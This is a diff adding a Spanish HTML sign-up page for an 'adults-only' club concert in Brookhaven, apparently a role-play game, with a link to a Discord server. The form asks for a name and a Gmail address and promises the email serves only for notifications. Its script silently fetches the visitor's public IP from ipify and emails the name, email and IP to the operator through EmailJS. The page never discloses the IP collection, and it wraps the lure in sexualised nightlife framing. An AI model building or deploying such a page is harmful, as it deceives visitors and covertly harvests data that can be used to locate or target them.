@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<title>MAMITAS CLUB — CONCIERTO 2026</title>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<link rel="stylesheet" href="style.css">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+</head>
+<body>
+
+<!-- INTRO -->
+<div class="container" id="intro">
+  <h1>MAMITAS CLUB — CONCIERTO 2026</h1>
+  <p class="subtitulo">Noche exclusiva para adultos — Acceso limitado</p>
+
+  <div class="card">
+    <h2>¿Qué es este evento?</h2>
+    <p class="descripcion">
+      Una experiencia nocturna privada diseñada para adultos que buscan música, espectáculo y ambiente VIP en Brookhaven. ¡Prepárate para socializar y disfrutar!
+    </p>
+  </div>
+
+  <div class="card">
+    <h2>Cosas que incluye</h2>
+    <ul>
+      <li>Música estilo club y concierto en todo el teatro</li>
+      <li>Teatro con diseño profesional nocturno</li>
+      <li>Shows de baile en mesas y escenario</li>
+      <li>Evento sorpresa cada hora que aumenta la intensidad</li>
+      <li>Zonas sociales y after party</li>
+      <li>Acceso privado — Solo invitados</li>
+    </ul>
+  </div>
+
+  <button class="btn-principal" id="btn-siguiente">Siguiente</button>
+</div>
+
+<!-- PANEL DE REGISTRO -->
+<div class="container" id="registro" style="display:none;">
+  <div class="card registro-panel">
+    <h2>Solicitar acceso al evento</h2>
+    <p class="descripcion info-segura">
+      Necesitamos tu correo electrónico para enviarte notificaciones sobre tu solicitud. 
+      Te avisaremos por correo si has sido seleccionado para asistir al evento. 
+      Tu correo solo se usará para este propósito y nunca será compartido con terceros.
+    </p>
+
+    <form id="form">
+      <input type="text" id="nombre" placeholder="Nombre de acceso" required>
+      <input type="email" id="correo" placeholder="Correo Gmail" required>
+      <button type="submit" class="btn-principal">SOLICITAR ACCESO</button>
+    </form>
+
+    <p id="mensaje"></p>
+  </div>
+</div>
+
+<!-- CONFIRMACIÓN -->
+<div class="container" id="confirmacion" style="display:none;">
+  <h1>¡SOLICITUD ENVIADA!</h1>
+  <p class="descripcion">
+    Tu solicitud ha sido registrada correctamente. Recibirás un correo si has sido seleccionado para asistir al evento.
+  </p>
+  <p class="descripcion">
+    Revisa tu bandeja de entrada y también la carpeta de spam.
+  </p>
+
+  <a href="https://discord.gg/Brp6umwmZ" target="_blank" class="btn-principal">IR AL DISCORD OFICIAL</a>
+  <button class="btn-secundario" id="volver">VOLVER AL INICIO</button>
+</div>
+
+<script>
+emailjs.init("6pBfQTGxRI_l0GYvp");
+
+// Botón Siguiente para mostrar registro
+document.getElementById("btn-siguiente").addEventListener("click", function(){
+  document.getElementById("intro").style.display = "none";
+  document.getElementById("registro").style.display = "block";
+});
+
+// Enviar formulario
+document.getElementById("form").addEventListener("submit", function(e){
+  e.preventDefault();
+
+  let nombre = document.getElementById("nombre").value;
+  let correo = document.getElementById("correo").value;
+
+  fetch("https://api.ipify.org?format=json")
+    .then(res => res.json())
+    .then(data => {
+      let ipUsuario = data.ip;
+
+      emailjs.send("service_s0dzp4t", "template_2kjax0z", {
+        nombre: nombre,
+        correo: correo,
+        ip: ipUsuario
+      })
+      .then(function(){
+        document.getElementById("registro").style.display = "none";
+        document.getElementById("confirmacion").style.display = "block";
+      })
+      .catch(function(error){
+        console.log(error);
+        document.getElementById("mensaje").innerText = "❌ Error enviando datos.";
+      });
+
+    })
+    .catch(error => {
+      console.log(error);
+      document.getElementById("mensaje").innerText = "❌ No se pudo obtener la IP.";
+    });
+});
+
+// Volver al inicio
+document.getElementById("volver").addEventListener("click", function(){
+  document.getElementById("confirmacion").style.display = "none";
+  document.getElementById("intro").style.display = "block";
+});
+</script>
+
+</body>
+</html>
